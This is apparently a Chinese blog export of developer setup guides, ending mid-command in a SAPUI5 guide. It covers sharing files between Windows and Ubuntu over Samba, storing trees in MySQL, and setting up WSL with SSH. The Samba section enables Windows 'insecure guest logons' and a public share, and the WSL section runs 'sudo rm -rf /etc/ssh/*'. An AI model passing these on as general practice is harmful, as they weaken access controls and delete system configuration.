    <content><![CDATA[<h2 id="零、背景"><a href="#零、背景" class="headerlink" title="零、背景"></a>零、背景</h2><p>Mac Book Pro （MBP）一直是极客开发者首选的操作系统，然而在工作中，并不是每个公司都会为开发者配备 MBP 的，然而，相信有强迫症的程序员都无法忍受 Windows 的命令行工具，我也不例外。好再微软在 2019 年 5 月推出了一款 Windows Terminal（截至作者撰稿时，仅 Preview 版可用），可以说给基于 Window 开发的程序员带来了福音。</p>
<span id="more"></span>

<p>然而不幸的是，Windows Terminal 只能在 Windows 10 的某些高版本中使用，而作者所在公司仅支持 Windows 7 系统，好在同事申请了一台 MBP 后我把他原来的 Windows 机借过来了，所以作者就拥有了两台开发机器。基于以上背景，本文记录了使用 Window 配合 Linux 搭建舒畅的开发环境的过程。操作系统配置信息如下：</p>
<table>
<thead>
<tr>
<th align="center">OS</th>
<th align="center">Version</th>
<th align="center">CPU core</th>
<th align="center">Memory</th>
<th align="center">Disk</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Windows 10</td>
<td align="center">1809</td>
<td align="center">4</td>
<td align="center">16G</td>
<td align="center">512G(SSD)</td>
</tr>
<tr>
<td align="center">Ubuntu</td>
<td align="center">18.04</td>
<td align="center">4</td>
<td align="center">16G</td>
<td align="center">512G</td>
</tr>
</tbody></table>
<p>由于 Linux 机器无法接入公司的域，同时很多办公软件在 Linux 下没有简单的替代品，最终选择 Windows + Ubuntu 的解决方案：</p>
<ul>
<li>Windows — 办公，负责邮件，文档，多媒体的处理。</li>
<li>Linux — 开发，负责部署开发环境</li>
</ul>
<p>两台主机协同办公，难免会存在如下问题：</p>
<ol>
<li>Linux 机器无法接入办公网，导致代码不能正常部署&#x2F;下载</li>
<li>Windows 和 Linux 之间难免有文件传输</li>
<li>多鼠标&#x2F;键盘且换带来困扰</li>
</ol>
<p>只需要解决如上三个问题，两台电脑开发几乎游刃有余，经过摸索以及实践，最终采用如下方案解决如上三个问题，</p>
<ol>
<li>Windows 机器接入公司域，然后开启热点，供 Linux 使用，以保证两台电脑在一个局域网内</li>
<li>Linux 机器上安装 Samba 服务，将目录共享到 Windows 机器上，方便文件传输</li>
<li>使用 Synergy 实现键鼠共享，一套键鼠共同控制两台主机</li>
</ol>
<p>本文后续即为以上解决方案的绝体实现，仅供你参考，如有疑惑可以自行 Google 或者通过邮件与我交流。</p>
<h2 id="一、搭建-Samba-服务"><a href="#一、搭建-Samba-服务" class="headerlink" title="一、搭建 Samba 服务"></a>一、搭建 Samba 服务</h2><h3 id="1-1-Linux-安装-Samba-服务"><a href="#1-1-Linux-安装-Samba-服务" class="headerlink" title="1.1 Linux 安装 Samba 服务"></a>1.1 Linux 安装 Samba 服务</h3><p><strong>Samba service Installation</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">sudo</span> apt-get install -y samba samba-common</span></span><br></pre></td></tr></table></figure>

<p><strong>创建共享目录</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">cd</span> ~ &amp;&amp; <span class="built_in">mkdir</span> share</span></span><br></pre></td></tr></table></figure>

<p><strong>添加账号</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">sudo</span> smbpasswd -a gbin <span class="comment"># gbin 账号必须是系统中存在的账号，如果系统中不存在则先 useradd 添加账号</span></span></span><br></pre></td></tr></table></figure>

<p><strong>修改配置</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">sudo</span> vim /etc/samba/smb.conf</span></span><br></pre></td></tr></table></figure>

<p>末尾添加如下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[share]</span><br><span class="line">    comment = share from ubuntu</span><br><span class="line">    browseable = yes</span><br><span class="line">    path = /home/gbin/share</span><br><span class="line">    create mask = 0700</span><br><span class="line">    directory mask = 0700</span><br><span class="line">    valid users = gbin</span><br><span class="line">    force user = gbin</span><br><span class="line">    force group = gbin</span><br><span class="line">    public = yes </span><br><span class="line">    available = yes </span><br><span class="line">    writable = yes</span><br></pre></td></tr></table></figure>

<p><strong>重启 smbd 服务</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">sudo</span> service smbd restart</span></span><br></pre></td></tr></table></figure>

<h3 id="1-2-Windows-接入共享文件夹"><a href="#1-2-Windows-接入共享文件夹" class="headerlink" title="1.2 Windows 接入共享文件夹"></a>1.2 Windows 接入共享文件夹</h3><p>打开资源管理器，输入 <a href="">\your-ip\your-shared-folder</a>，在弹出的对话框中输入账号密码。输入完成后，即可在 Windows 上开发项目，对项目的更改会实时同步到 Linux 中，修改完成后可直接在 Linux 中编译运行，Web 等项目则可以直接在 Window 中通过浏览器远程访问项目。</p>
<p><strong>[Optional]</strong>: 将共享目录映射成一个 Drive<br>打开资源管理器 -&gt; Network -&gt; Map Network Drive:<br><img src="/images/2019-07/map-drive.png"></p>
<h3 id="1-3-Optional-troubleshooting"><a href="#1-3-Optional-troubleshooting" class="headerlink" title="1.3 [Optional] troubleshooting"></a>1.3 [Optional] troubleshooting</h3><p><strong>Window 无法连接共享文件夹</strong><br>Window 尝试连接共享文件夹时，报如下错误：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">You Can’t  Access This Share Folder Because Your Organisation’s Security Policies Block Unauthenticated Guest Access.</span><br></pre></td></tr></table></figure>
<p><img src="/images/2019-07/can-not-access-shared-folder.png" alt="can not access shared folder"></p>
<ul>
<li><p>ssh 登录 ubuntu，使用 smbclient 检查 samba 服务的可用性</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">sudo</span> apt-get install -y smbclient</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">smbclient -L \\localhost -U username%your-password</span></span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">WARNING: The &quot;syslog&quot; option is deprecated</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        share           Disk      share from ubuntu</span><br><span class="line">        IPC$            IPC       IPC Service (gbin-dev server (Samba, Ubuntu))</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line"></span><br><span class="line">        Server               Comment</span><br><span class="line">        ---------            -------</span><br><span class="line"></span><br><span class="line">        Workgroup            Master</span><br><span class="line">        ---------            -------</span><br><span class="line">        WORKGROUP            GBIN-DEV</span><br></pre></td></tr></table></figure>

<p>其中看到 <code>share from ubuntu</code> 的注释代表 smb 服务启动成功</p>
</li>
<li><p>修改 windows 的配置<br>按照这个<a href="https://www.windowproblemsolve.com/2019/05/you-can-not-access-this-shared-folder.html">教程</a> 开启 <code>insecure guest logons</code> 选项</p>
</li>
</ul>
<h2 id="二、键鼠共享"><a href="#二、键鼠共享" class="headerlink" title="二、键鼠共享"></a>二、键鼠共享</h2><h2 id="其他方案"><a href="#其他方案" class="headerlink" title="其他方案"></a>其他方案</h2><h3 id="Windows-WSL-Window-Terminal"><a href="#Windows-WSL-Window-Terminal" class="headerlink" title="Windows + WSL + Window Terminal"></a>Windows + WSL + Window Terminal</h3><p>最近，微软发布了 <a href="https://github.com/microsoft/terminal">Windows Terminal</a> 的 <a href="https://www.microsoft.com/en-us/p/windows-terminal-preview/9n0dx20hk701">preview</a> 版本，该方案也是值得尝尝新，但是要求 Window 10 的系统版本要 <code>&gt;=1903</code>，因为公司电脑统一升级，我尝试自己升级两次后都失败了，所以放弃了该方案，感兴趣的同学可以自己尝试尝试。 </p>
<h3 id="Windows-Virtual-Machine"><a href="#Windows-Virtual-Machine" class="headerlink" title="Windows + Virtual Machine"></a>Windows + Virtual Machine</h3><p>这种方案是使用诸如  VMware Workstation (Player || pro)、Hyper-V、VirtualBox 之类的虚拟机管理软件安装 Linux 虚拟机，然后虚拟机和主机之间通过某些方案(虚拟机的文件夹共享或者 samba 服务)进行文件共享，最后在 Windows 上进行开发，在 VM 上完成编译。</p>
<p>在没有远程 Linux 的情况下可以考虑使用这种方案，但是可能会遇到如下问题：</p>
<ul>
<li><p>网络问题</p>
<p>虚拟机提供多种网络环境，如果要接入外网的话一般会选 <code>Bridge</code> 和 <code>NAT</code> 这两种方案之一。但是，一般来讲公司的内网 IP 会受限制，无法使用 <code>Bridge</code>，而使用 <code>NAT</code> 网络时，VM Player 对端口转发支持并不是很好(Pro 版要收费)。总的来讲，一是折腾起来很麻烦， 二十使用虚拟机本身就很耗费资源，显得臃肿，与极客开发者的性格不相符合。</p>
</li>
<li><p>文件夹共享问题</p>
<p>使用虚拟机管理软件提供的文件夹共享可以把 Windows 宿主机下的文件夹挂在到 Linux 中，但是这种方式在共享文件夹中使用 <code>npm</code> 会有一些坑，与 <code>symlink</code> 相关，详情可以参考<a href="https://blog.csdn.net/joshua2011/article/details/88580489">这里</a><br><img src="/images/2019-07/share-folder.png"></p>
<p>除了使用虚拟机管理软件提供的文件夹共享方式以外，还可以用 samba 服务把虚拟机里的目录共享到宿主机上，这样可以很方便的在 Windows 上开发，在 Linux 中完成编译运行。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Guide</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>树在 MySQL 中的存储方式</title>
    <url>/fundamental/storage/mysql-store-tree-using-closure-table/</url>
    <content><![CDATA[<p>参考《大话数据结构》，如下定义树：</p>
<blockquote>
<p>树（Tree）是n（n&gt;&#x3D;0）个结点的有限集。n&#x3D;0时称为空树。在任意一颗非空树中：<br>有且仅有一个特定的称为根（root）的结点；<br>当n&gt;1时，其余结点可分为m(m&gt;0)个互补交互的有限集T1、T2…Tm，其中每一个集合本身又是一棵树，并称为根的子树（SubTree）。</p>
</blockquote>
<p>在工作中，树被广泛使用，最常见的就是数据库中的 B+ 树，除此之外，网站中的菜单也常常是用树来表达其中的层次关系的（hierarchical），本文重点讲解基于菜单树这种应用常见下树在数据库中的存储方式。</p>
<span id="more"></span>

<p>参考《SQL 反模式》，树在数据库中常见的存储方式有：</p>
<ul>
<li>领接表</li>
<li>路径枚举</li>
<li>嵌套集</li>
<li>闭包表</li>
</ul>
<p>最简单最常见的是领接表，最高效的是闭包表，所以本文将重点讨论领接表和闭包表。</p>
<h2 id="领接表"><a href="#领接表" class="headerlink" title="领接表"></a>领接表</h2><p>这种存储方式很简单，就是给每一条记录添加一个指向父亲节点的指针，即 parent_id。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> `menus` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) unsigned <span class="keyword">NOT NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;自增id&#x27;</span>,</span><br><span class="line">  `menu_name` <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;语义化的菜单名称&#x27;</span>,</span><br><span class="line">  `parent_id` <span class="type">int</span>(<span class="number">10</span>) <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;1&#x27;</span> COMMENT <span class="string">&#x27;菜单父节点id&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY KEY</span> (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">7</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 COMMENT<span class="operator">=</span><span class="string">&#x27;菜单表&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/2019-03/linkedList_menu_tree.png"></p>
<h2 id="闭包表"><a href="#闭包表" class="headerlink" title="闭包表"></a>闭包表</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> `menu_tree` (</span><br><span class="line">  `ancestor` <span class="type">bigint</span>(<span class="number">20</span>) unsigned <span class="keyword">NOT NULL</span> COMMENT <span class="string">&#x27;祖先节点&#x27;</span>,</span><br><span class="line">  `descendant` <span class="type">bigint</span>(<span class="number">20</span>) unsigned <span class="keyword">NOT NULL</span> COMMENT <span class="string">&#x27;子代节点&#x27;</span>,</span><br><span class="line">  `distance` <span class="type">int</span>(<span class="number">11</span>) unsigned <span class="keyword">NOT NULL</span> COMMENT <span class="string">&#x27;子孙到祖先中间相差的层级数目&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY KEY</span> `uniq_ancestor_descendant` (`ancestor`,`descendant`,`distance`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">10</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 COMMENT<span class="operator">=</span><span class="string">&#x27;菜单闭包表&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/2019-03/closure_menu_table.png"></p>
<p>&#x2F;&#x2F; 未完，待续……</p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Storage</category>
      </categories>
      <tags>
        <tag>Tree</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建基于 Windows 10 和 WSL 的开发环境不完全指南</title>
    <url>/experience/guide/dev-environment-on-windows-with-wsl/</url>
    <content><![CDATA[<h2 id="零、背景"><a href="#零、背景" class="headerlink" title="零、背景"></a>零、背景</h2><p>前段时间博主曾经写过一篇文章<a href="https://0x400.com/2019-07-02-dev-environment-on-windows-and-linux.html">《Windows 10 配合 Ubuntu 搭建舒适开发环境不完全指北》</a>，文章介绍了如何使用 Windows 配合 Ubuntu 搭建舒适的开发环境，此后博主由于一些个人因素离开了上家公司，加入了目前的公司。不巧的是，新公司默认情况下配置的电脑也是 Windows（后来听说入职之前可以向 HR 申请 MBP，但我没有申请），而且电脑一旦配发，如无损坏需用满三年才能更换，而我特别不喜欢使用 Windows 的 Terminal 工具。一方面是开发环境部署困难，比如安装 Python 你可能需要自行下载 Python 安装镜像然后手动安装，安装完成后可能还需要配置环境变量，几乎所有的开发工具在 Windows 下的安装都是类似的；另一方面是 Terminal 界面丑陋，用户体验较差。即使有 Git Bash，Cmder，PowerShell，choco 等一系列辅助工具，还是无法赢得很多喜欢命令行工具的程序员的青睐， 我也一样。 </p>
<span id="more"></span>

<p>随着 WSL 第二代和 Windows Terminal 的发布，以及几天以前微软推出了新的编程字体 <a href="https://github.com/microsoft/cascadia-code">https://github.com/microsoft/cascadia-code</a>   ，再次给使用 Windows 作为开发机器的程序员带来了重生的希望。但是 Windows Terminal 和 WSL 第二版必须要求 Windows 发布版本大于等于 1903，目前共同公司配备的 Windows 是 1809，恰好能用 WSL 的第一版，但不能用 Windows Terminal 和 WSL 第二版。好在 Windows 1903 的版本公司正在积极定制中，应该马上能用了，可喜可贺。</p>
<p>基于以上背景，本文记录了在 Windows 1809 版本下配合 WSL 第一版部署舒适开发环境的过程。</p>
<h2 id="一、依赖"><a href="#一、依赖" class="headerlink" title="一、依赖"></a>一、依赖</h2><p>安装 Windows Terminal 要求必须是 <strong>Windows 10</strong>系统，且系统版本 <code>&gt;= 16237.0 </code></p>
<p>按下<code>win</code>建，输入 <code>about your PC</code> ，回车后在 <code>Windows specifications</code> 一节中查看系统版本</p>
<p><img src="/images/2019-09/check-version.png"></p>
<h2 id="二、安装-WSL"><a href="#二、安装-WSL" class="headerlink" title="二、安装 WSL"></a>二、安装 WSL</h2><h3 id="2-1-开启子系统"><a href="#2-1-开启子系统" class="headerlink" title="2.1 开启子系统"></a>2.1 开启子系统</h3><p><strong>方式一：（推荐）通过命令行开启</strong></p>
<ol>
<li><p>使用管理员方式打开 PowerShell 执行如下命令：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Enable-WindowsOptionalFeature</span> <span class="literal">-Online</span> <span class="literal">-FeatureName</span> Microsoft<span class="literal">-Windows-Subsystem-Linux</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>重启电脑</p>
<p>Win - R: 输入 <code>shutdown -r -t 00</code></p>
</li>
</ol>
<p><strong>方式二： 使用图形化界面开启子系统功能</strong></p>
<p>如果不是写作需要，我会更倾向使用命令行方式开启 WSL 功能，使用更少的操作完成更复杂的功能，这是程序员与生俱来的特点，因为时间是宝贵的。</p>
<p>步骤1： 按 Win - R，输入 <code>control</code> 后回车</p>
<p><img src="/images/2019-09/enable-wsl-step-1.png"></p>
<p>步骤2： 点击 “Uninstall a program” </p>
<p><img src="/images/2019-09/enable-wsl-step-2.png"></p>
<p>步骤3： 点击 “Turn Windows features on or off “ </p>
<p><img src="/images/2019-09/enable-wsl-step-3.png"></p>
<p>步骤4：找到 “Windows Subsystem for Linux” 确保前面的选择框被选中</p>
<p><img src="/images/2019-09/enable-wsl-step-4.png"></p>
<p>重启电脑。</p>
<h2 id="2-2-安装-Ubuntu-16-04"><a href="#2-2-安装-Ubuntu-16-04" class="headerlink" title="2.2 安装 Ubuntu 16.04"></a>2.2 安装 Ubuntu 16.04</h2><p>打开 Microsoft Store，输入 Ubuntu，选择评分最高的那个安装。</p>
<p><img src="/images/2019-09/ubuntu-selected.png"></p>
<p>安装完成后，初次打开 Ubuntu Terminal 会进行初始化，输入 Ubuntu 的账号和密码，回车后等待初始化完成即可。</p>
<h2 id="三、WSL-初始化"><a href="#三、WSL-初始化" class="headerlink" title="三、WSL 初始化"></a>三、WSL 初始化</h2><ol>
<li><p>替换国内源</p>
<p>备份 <code>/etc/apt/sources.list</code> 后，使用 root 权限修改 sources.list 的内容，博主使用的是清华大学提供的镜像，内容如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse</span></span><br></pre></td></tr></table></figure>

<p>详细信息请查阅 <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/">https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/</a></p>
</li>
<li><p>更新系统</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> apt update</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>安装 ssh</p>
<p>系统更新完成后，默认会安装旧版 <code>openssh-server</code>， 所以需要手动卸载旧版 <code>openssh-server</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> apt remove openssh-server</span></span><br></pre></td></tr></table></figure>

<p>由于旧版 <code>openssh-server</code> 配置和最新版不兼容，所以需要删除原来的配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> <span class="built_in">rm</span> -rf /etc/ssh/*</span></span><br></pre></td></tr></table></figure>

<p>安装 <code>openssh-server</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> apt install openssh-server</span></span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>： 由于 WSL 和 Windows 共享端口，而 22 端口被 Windows 占用，所以需要手动更换 ssh 的端口或者确保 Windows 的 22 端口可用且防火墙开启 22 端口，显然更换 WSL 的 ssh 端口会简单一些，如下：</p>
<p>打开 <code>sudo vim /etc/ssh/sshd_config</code>，将 <code>Port 22</code> 改成 <code>Port 2222</code> （或者其他可用端口）</p>
<p>启动 ssh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> service ssh start</span></span><br></pre></td></tr></table></figure>

<p>正常启动后即可在 Windows 下使用 SSH 工具连接到 WSL，其中地址是 127.0.0.1 或者 localhost，端口和用户密码安装自定义的填写。</p>
</li>
<li><p>搭建开发环境</p>
<p>根据需要，安装好 Python&#x2F;Node.js&#x2F;NVM&#x2F;Git&#x2F;Docker 等工具。</p>
<p><strong>注意</strong>： WSL 第一版中并没有使用真正的 Linux 的内核，因此导致 Dockerd 不可用，如需使用 Dockerd，请使用 WSL 2，具体参考 <a href="https://docs.microsoft.com/en-us/windows/wsl/wsl2-about">https://docs.microsoft.com/en-us/windows/wsl/wsl2-about</a></p>
</li>
<li><p>初始化项目</p>
<p>WSL 初始化完成后，将 Windows 的某个盘（如 d）划分为开发盘，Windows 的所有磁盘会被挂在到 <code>/mnt/</code> 目录下，进入 <code>/mnt/d/</code> 工作目录，克隆项目到此处，开始愉快的开发。:)</p>
<p><strong>备注</strong>： 挂载在 WSL 下的 Windows 目录会带有绿色背景，这种色调对我来讲特别不舒服，就像是总在提示我不是真正的 Linux 文件系统，而是 Windows 挂在进来的 NTFS 系统一样。为了去掉绿色背景，我改了一下目录配色方案：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">touch</span> ~/.dir_colors</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;OTHER_WRITABLE 35;40&quot;</span> &gt; ~/.dir_colors</span></span><br></pre></td></tr></table></figure>

<p>在 <code>.bashrc</code> 末位添加一行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">eval `dircolors $HOME/.dir_colors`</span><br></pre></td></tr></table></figure>

<p>source 一下 <code>.bashrc</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">source</span> ~/.bashrc</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>WSL 和项目初始化完成后，在 Windows 机器下使用相应编辑器或者 IDE 进行开发，开发完成后，在WSL中编译运行，爽哉！特别是最近在 VS Code 对 WSL 原生支持后，中小项目甚至可以将项目目录直接放在 WSL 里面，参考 <a href="https://code.visualstudio.com/docs/remote/wsl%EF%BC%8C%E5%8F%AA%E4%B8%8D%E5%A4%9A%E8%BF%99%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%8F%AA%E8%83%BD%E5%BA%94%E4%BB%98%E4%B8%AD%E5%B0%8F%E5%9E%8B%E9%A1%B9%E7%9B%AE%EF%BC%8C%E9%A1%B9%E7%9B%AE%E5%A4%A7%E5%88%B0%E4%B8%80%E5%AE%9A%E7%A8%8B%E5%BA%A6%E6%97%B6%E5%8F%AF%E8%83%BD%E9%9C%80%E8%A6%81%E4%B8%93%E4%B8%9A%E7%9A%84%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%A6%82">https://code.visualstudio.com/docs/remote/wsl，只不多这种方式只能应付中小型项目，项目大到一定程度时可能需要专业的开发工具，如</a> WebStorm 。像 WebStorm 这类开发工具对 WSL 没有原生支持，无法打开（WSL的目录可以在Windows中被编辑，但是不能这样做，这样会导致权限出错）在 WSL 里面的项目，如果项目目录在 WSL 里面，这时要在 Windows 下开发就必须将 WSL 里的目录映射到 Windows 上，Samba 服务可以实现。<strong>经过笔者的实践表明，小项目使用何种方式开发都可以，当项目大一定程度后， VS Code 已经无法智能补全了，这时候使用 IDE 也许是更好的选择。这种场景下，使用 WebStorm 打开 Samba 共享出来的项目目录开发会变得异常卡顿，所以最优的选择还是直接将项目放在 Windows 下，使用 IDE 直接打开 NTFS 系统中的项目文件，然后挂载进 WSL 中编译运行。</strong></p>
<p><strong>提示</strong>：在 Windows 中使用 IDE 开发项目时，可以将 IDE 的 Terminal 绑定成 WSL，如<a href="https://stackoverflow.com/questions/51912772/how-to-use-wsl-as-default-terminal-in-webstorm-or-any-other-jetbrains-products">JetBrains 设置 Teminal 为 WSL</a></p>
<h2 id="四、踩过的坑"><a href="#四、踩过的坑" class="headerlink" title="四、踩过的坑"></a>四、踩过的坑</h2><ol>
<li>openssh-server  新旧版本配置不兼容，需删除旧配置再安装新版本</li>
<li>Ubuntu 18.04 的 WSL 无法安装 Samba 服务，Samba 服务在  WSL 下安装异常复杂，需要关闭 Windows 下的一些服务，释放占用的 139 和 445 端口。</li>
<li>VS Code Remote + WSL 开发方式只适用于小项目，大型项目背景下， VS Code 索引文件不太友好，智能提示几乎崩溃</li>
<li>WSL + Samba + WebStorm 在大项目背景下开发异常卡顿，甚至卡死。</li>
</ol>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Guide</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>WSL</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建 SAPUI5 开发环境</title>
    <url>/experience/guide/dev-getting-started-with-sapui5/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>SAPUI5 官方文档有专门的一节是讲 SAPUI5 的开会环境的 - <a href="https://sapui5.hana.ondemand.com/#/topic/7bb04e05f9484e1b95b38a2e48ecef4f">Development Environment</a>，按照官方文档介绍，搭建 SAPUI5 的开发环境主要有三种方式：</p>
<ul>
<li>SAP Web IDE - Cloud</li>
<li>ui5 tooling - Local </li>
<li>OpenUI5 - Local</li>
</ul>
<p>为什么还要写这篇文章呢？</p>
<span id="more"></span>
<p>官方文档主要详细介绍了使用 SAP Web IDE 搭建 SAPUI5 的开发环境，但这种方式有诸多不足，如编码效率不高，不方便调试，不能使用 Vim 编码，还需要申请 Cloud 账号等，因此搭建本地开发环境是我学习 SAPUI5 的首选。文档虽然也有简单介绍使用 OpenUI5 和 使用 <a href="https://sap.github.io/ui5-tooling/">ui5</a> 工具搭建本地开发环境，但通篇晦涩并缺少实践步骤，按照文档搭建环境的过程还可能会遇到一些奇怪的错误。所以本文的出现主要是为了记录我搭建环境中遇到的一些问题，以便后续查阅。</p>
<p>SAPUI5 的核心文件是 <em>sap-ui-core.js</em>，理论上只需要引入该文件就可以使用 SAPUI5 了，但开发过程中我们往往更需要的是一个本地的 server，本文会主要讲述使用 ui5 工具启动的 SAPUI5 开发环境。</p>
<blockquote>
<p>注释： 本文中 ui5 表示的是 ui5 tooling - (<a href="https://sap.github.io/ui5-tooling/)%EF%BC%8CSAPUI5">https://sap.github.io/ui5-tooling/)，SAPUI5</a> 表示 SAPUI5 框架。</p>
</blockquote>
<h2 id="使用-ui5-搭建-SAPUI5-开发环境"><a href="#使用-ui5-搭建-SAPUI5-开发环境" class="headerlink" title="使用 ui5 搭建 SAPUI5 开发环境"></a>使用 ui5 搭建 SAPUI5 开发环境</h2><p>使用 ui5 搭建 SAPUI5 主要分为如下四个步骤，</p>
<ol>
<li>创建项目</li>
<li>创建 Hello world 入口文件</li>
<li>使用 ui5 引入 SAPUI5 框架</li>
<li>启动</li>
</ol>
<p>下文将详述描述着四个步骤。</p>
<h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><p>本节我们将创建一个基本的 SAPUI5 项目目录。</p>
<p>创建项目 <em>demo-ui5</em>，并在 <em>demo-ui5</em> 目录下创建子目录 <em>src&#x2F;com&#x2F;0x400&#x2F;hello</em>，所有 SAPUI5 相关的代码我们都将放在 <em>src&#x2F;com&#x2F;0x400&#x2F;hello</em> 下面，这个目录结构也将会映射成一个命名空间 <code>com.0x400.hello</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> -p demo-ui5</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> demo-ui5</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">yarn init -y</span></span><br><span class="line">yarn init v1.22.4</span><br><span class="line">warning The yes flag has been set. This will automatically answer yes to all questions, which may have security implications.</span><br><span class="line">success Saved package.json</span><br><span class="line">Done in 0.05s.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> -p 